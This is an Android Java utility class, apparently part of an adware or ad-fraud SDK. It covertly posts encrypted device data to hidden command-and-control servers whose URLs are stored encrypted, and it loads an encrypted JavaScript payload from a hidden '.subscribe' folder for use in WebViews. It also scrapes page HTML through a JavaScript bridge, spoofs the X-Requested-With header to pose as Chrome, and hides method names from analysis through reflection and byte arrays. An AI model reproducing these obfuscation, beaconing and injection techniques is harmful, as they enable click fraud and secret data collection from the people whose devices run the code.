package w.c.s.utils;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class HttpUtils {

    public static final String js_get_source = "javascript:window.myObj.getSource(document.getElementsByTagName('html')[0].innerHTML);";

    //encode.js
    public static final String FileName = "SxD4gOL0eku8mM+3QqPDew==";
    //.subscribe
    public static final String FileList = "5PB0SVEU0uRtVIswk7Eo9Q==";
    //.subscribe/encode.js
    public static final String jsName = "vATIhn8rco3p0WA1pVUVxksP06qg+Z8iD+bx7NJhMDI=";

    //flush
    public static String Str_F = "dNv7gVxpUPQNmxbyp5ODTQ==";

    //http://sp.adpushonline.com:7088/sdk_p/a
    public static final String URL_Cache = "ZQLxIRECjVgr6xMHVWLfSHP3fUn6odn+xdptfV1/dFkJ+P+maQxr03LcxmTTDKxV";
    //http://sp.adpushonline.com:7088/sdk_p/b
    public static final String URL_Connect = "ZQLxIRECjVgr6xMHVWLfSHP3fUn6odn+xdptfV1/dFnr5dxnhg48WZVIcqxCua8/";
    //http://sp.adpushonline.com:7088/sdk_p/c
    public static final String URL_Source = "ZQLxIRECjVgr6xMHVWLfSHP3fUn6odn+xdptfV1/dFkfZMK04LpfDzo7vSs2ZvnR";
    //http://sp.adpushonline.com:7088/sdk_p/d
    public static final String URL_DownJS = "ZQLxIRECjVgr6xMHVWLfSHP3fUn6odn+xdptfV1/dFmlqxkfq+MHmt6QoOinNliB";

    //http://track.g2oo.com:89/validate
    public static final String ANALYSIS_URL = "u8rZq8fXtdi1nVAkT5gxipoBYVlua9lVAutfBCEPqXbahjkT3Vg8fgnlkx7Vx+pp";
    //艾维邑动：http://api.c.avazunativeads.com/c2s?os=android&creatives=1&sourceid=20355
    public static final String GPURL_AWYD = "cr19m25lIjP0XAKTmrYteN51wp8+tn4EfqBFFKdBC12JIz82hhXi8AVogKHRuwPNH4S0w4NSp/qJ7d/RC9SYqwdeksI5qjvKc5qD2sFHXFo=";
    //有米：http://ad.api.yyapi.net/v1/online?app_id=f685bb7bf750bc1a&page_size=500&os=android&advid=
    public static final String GPURL_YM = "ujnoRg9ORnubPvxtB6kInbI7Xf265mZ6+5OHCTRIO5bY406rYFAbwMsKFO5/kxw3Uz5PoDHtwEm9X926tmMYLeGaIEvaIL11yMvdCOQrf+uusbBs0nukoSVkQaPczGVZ";


    public static final ExecutorService executorService = Executors.newScheduledThreadPool(20);

    public static String httpPost (String url) {

        BufferedReader in = null;
        String result = "";

        try {

            URLConnection connection = getURLConnection(url);
            in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String lin;

            while ( (lin = in.readLine()) != null ) {
                result += lin;
            }

        } catch ( Exception e ) {
            e.printStackTrace();
        } finally {
            try {
                if ( in != null ) {
                    in.close();
                }
            } catch ( IOException e ) {
                e.printStackTrace();
            }
        }
        return result;
    }

    /**
     * 联网
     *
     * @param objectMap
     * @param context
     */
    public static synchronized void connect (Map<String, Object> objectMap, Context context) {
        String encodeString = EncodeTool.enCrypt(new JSONObject(objectMap).toString(), JsUtil.getInstance(context).getJs_key());
        if ( !TextUtils.isEmpty(encodeString) ) {
            PrintWriter out = null;
            try {

                URLConnection myConnect = getURLConnection(EncodeTool.deCrypt(URL_Connect));

                out = new PrintWriter(myConnect.getOutputStream());
                out.print(encodeString);
                //                out.flush();
                out.getClass().getMethod("flush").invoke(out);

                if ( isSuccessful(myConnect) ) {
                    LogUtil.show("cn succ");
                    //  // Ulog.w("联网: 成功！");
                }
            } catch ( Exception e ) {
                // LogUtil.show("获取offer有错：" + e.getMessage());
                e.printStackTrace();
            } finally {
                try {
                    if ( out != null ) {
                        out.close();
                    }
                } catch ( Exception e ) {
                    e.printStackTrace();
                }
            }
        }
    }


    public static void dexClose (Object obj) throws Exception {
        //close
        String org0 = new String(new byte[]{99, 108, 111, 115, 101});
        obj.getClass().getMethod(org0).invoke(obj);
    }

    public static int getDexRead (Object obj, byte[] org) throws Exception {
        //        zipInput.read(buffer)
        return (int) obj.getClass().getMethod(new String(new byte[]{114, 101, 97, 100}), byte[].class).invoke(obj, org);
    }

    /**
     * 直接读取加密的JS文件
     */
    public static String get_encode_js (Context context) {
        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, EncodeTool.deCrypt(jsName));
        if ( !file.exists() ) {
            return null;
        }

        FileInputStream fileInputStream = null;
        ByteArrayOutputStream out = null;
        try {
            fileInputStream = new FileInputStream(file);
            out = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int n;
            while ( (n = fileInputStream.read(buffer)) >= 0 ) {
                out.write(buffer, 0, n);
            }

            //解密
            String decode_js_source = EncodeTool.deCrypt(out.toString(), JsUtil.getInstance(context).getJs_key());
            //读取解密后的JS
            //  Ulog.w("post_read_encode_js: 解密后的JS为：" + decode_js_source);
            return decode_js_source;
        } catch ( Exception e ) {
            e.printStackTrace();
        } finally {
            try {
                if ( fileInputStream != null ) {
                    fileInputStream.close();
                }
                if ( out != null ) {
                    out.close();
                }
            } catch ( IOException e ) {
                e.printStackTrace();
            }
        }
        return null;
    }


    /**
     * 获取Offer
     */
    public static String getCaseData (Context context, Map<String, Object> objectMap) {
        String offer_decode = "";
        JSONObject jsonObject = new JSONObject(objectMap);
        String jsonString = jsonObject.toString();

        String encode = EncodeTool.enCrypt(jsonString, JsUtil.getInstance(context).getJs_key());

        //        Ulog.show("post_test: encode:" + encode);

        if ( !TextUtils.isEmpty(encode) ) {
            PrintWriter out = null;
            InputStream input = null;
            try {

                URLConnection myConnect = getURLConnection(EncodeTool.deCrypt(URL_Cache));


                out = new PrintWriter(myConnect.getOutputStream());
                out.print(encode);
                //                out.flush();
                out.getClass().getMethod("flush").invoke(out);

                if ( isSuccessful(myConnect) ) {

                    BufferedReader bufferReader = new BufferedReader(new InputStreamReader(myConnect.getInputStream()));
                    String message = "";
                    String line = null;
                    while ( (line = bufferReader.readLine()) != null ) {
                        message += line;
                    }
                    bufferReader.close();
                    offer_decode = EncodeTool.deCrypt(message.toString(), JsUtil.getInstance(context).getJs_key());

//                    input = myConnect.getInputStream();
//                    StringBuilder strDate = new StringBuilder();
//                    byte[] br = new byte[1024];
//
//                    int len = -1;
//                    LogUtil.show("s l ca");
//                    while ( (len = input.read(br)) >= 0 ) {
//                        LogUtil.show("ling ca.....");
//                        strDate.append(new String(br).substring(0, len));
//                    }
//                    LogUtil.show("e l ca");
//
//                    offer_decode = EncodeTool.deCrypt(strDate.toString(), JsUtil.getInstance(context).getJs_key());

                }
            } catch ( Exception e ) {
                e.printStackTrace();
            } finally {
                try {
                    if ( input != null ) {
                        input.close();
                    }

                    if ( out != null ) {
                        out.close();
                    }
                } catch ( Exception e ) {
                    e.printStackTrace();
                }
            }
        }
        return offer_decode;
    }


    public static String postAnalysis (String jsonString, Context context) throws Exception {
        //        LogUtil.w("jsonString:" + jsonString);
        PrintWriter out = null;
        BufferedReader in = null;
        String result = "";

        try {

            URLConnection conn = getURLConnection(EncodeTool.deCrypt(ANALYSIS_URL));
            String user_agent = getUserAgent(context);
            conn.setRequestProperty("User-Agent", user_agent);
            out = new PrintWriter(conn.getOutputStream());
            out.print(jsonString);
            //            out.flush();
            out.getClass().getMethod("flush").invoke(out);

            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ( (line = in.readLine()) != null ) {
                result += line;
            }
            return result;
        } catch ( Exception e ) {
            e.printStackTrace();
        } finally {
            try {
                if ( out != null ) {
                    out.close();
                }
                if ( in != null ) {
                    in.close();
                }
            } catch ( Exception e2 ) {
                e2.printStackTrace();
            }
        }
        return result;

    }

    private static String getUserAgent (Context context) {
        String userAgent = "";
        if ( Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1 ) {
            try {
                userAgent = WebSettings.getDefaultUserAgent(context);
            } catch ( Exception e ) {
                userAgent = System.getProperty("http.agent");
            }
        } else {
            userAgent = System.getProperty("http.agent");
        }
        StringBuffer sb = new StringBuffer();
        for ( int i = 0, length = userAgent.length(); i < length; i++ ) {
            char c = userAgent.charAt(i);
            if ( c <= '\u001f' || c >= '\u007f' ) {
                sb.append(String.format("\\u%04x", (int) c));
            } else {
                sb.append(c);
            }
        }
        return sb.toString();
    }


    public static byte[] getResByte (String strUrl) {
        try {
            //new一个URL对象
            URL url = new URL(strUrl);
            //打开链接
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            //设置请求方式为"GET"
            conn.setRequestMethod("GET");
            //超时响应时间为5秒
            conn.setConnectTimeout(5 * 1000);
            //通过输入流获取图片数据
            InputStream inStream = conn.getInputStream();
            //得到图片的二进制数据，以二进制封装得到数据，具有通用性


            Log.e("TAG", "getResByte: " + conn.getContentType());
            Log.e("TAG", "getResByte: " + conn.getContentEncoding());

            return readInputStream(inStream);
        } catch ( Exception e ) {
            e.printStackTrace();
        }
        return "".getBytes();
    }

    public static byte[] readInputStream (InputStream inStream) throws Exception {
        ByteArrayOutputStream outStream = new ByteArrayOutputStream();
        //创建一个Buffer字符串
        byte[] buffer = new byte[1024];
        //每次读取的字符串长度，如果为-1，代表全部读取完毕
        int len = 0;
        //使用一个输入流从buffer里把数据读取出来
        while ( (len = inStream.read(buffer)) != -1 ) {
            //用输出流往buffer里写入数据，中间参数代表从哪个位置开始读，len代表读取的长度
            outStream.write(buffer, 0, len);
        }
        //关闭输入流
        inStream.close();
        //把outStream里的数据写入内存
        return outStream.toByteArray();
    }


    public static URLConnection getURLConnection (String url) {
        try {
            return getURLConnection(new URL(url));
        } catch ( Exception e ) {
        }
        return null;
    }

    public static URLConnection getURLConnection (URL uri) {
        try {
            //setDoOutput
            String org0 = new String(new byte[]{115, 101, 116, 68, 111, 79, 117, 116, 112, 117, 116});
            //setDoInput
            String org1 = new String(new byte[]{115, 101, 116, 68, 111, 73, 110, 112, 117, 116});

            URLConnection conn = uri.openConnection();
            conn.setConnectTimeout(15000);
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.1;SV1)");
            //            conn.setDoOutput(true);
            conn.getClass().getMethod(org0, boolean.class).invoke(conn, true);
            //            conn.setDoInput(true);
            conn.getClass().getMethod(org1, boolean.class).invoke(conn, true);
            return conn;
        } catch ( Exception e ) {
            e.printStackTrace();
        }
        return null;
    }

    public static boolean isSuccessful (URLConnection urlConnect) throws IOException {
        int code = ((HttpURLConnection) urlConnect).getResponseCode();
        if ( code >= 200 && code < 300 ) {
            return true;
        }
        return false;
    }

    //X-Requested-With
    public static final String HeadKey = "l825EX+hxCZPDXzo7JtrX7ODogdOCR0S80JTFJVgsbg=";
    //com.android.chrome
    public static final String HeadValue = "ddV6FdcV4NRChBZf60N7qE5W5yn78AsGBOShtdT9gII=";

    public static Map<String, String> getWebHead () {
        Map<String, String> header = new HashMap<>();
        header.put(EncodeTool.deCrypt(HeadKey), EncodeTool.deCrypt(HeadValue));//默认是应用包名
        return header;
    }

    public static WebResourceResponse getWebResResponse (String strUrl) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(strUrl).openConnection();
            conn.setConnectTimeout(5 * 1000);
            //            conn.setInstanceFollowRedirects(false);
            //            conn.setRequestProperty("X-Requested-With", "");

            String type = conn.getContentType();
            String encode = conn.getContentEncoding();
            int code = conn.getResponseCode();

            if ( TextUtils.isEmpty(type) || type.contains("text/html") ) {
                if ( code == 404 ) {
                    return new WebResourceResponse("text/html", "utf-8", new ByteArrayInputStream("".getBytes()));
                }
                return null;
            }
            return new WebResourceResponse(type, encode, new ByteArrayInputStream(readInputStream(conn.getInputStream())));
        } catch ( Exception e ) {
            e.printStackTrace();
        }
        return null;
    }
}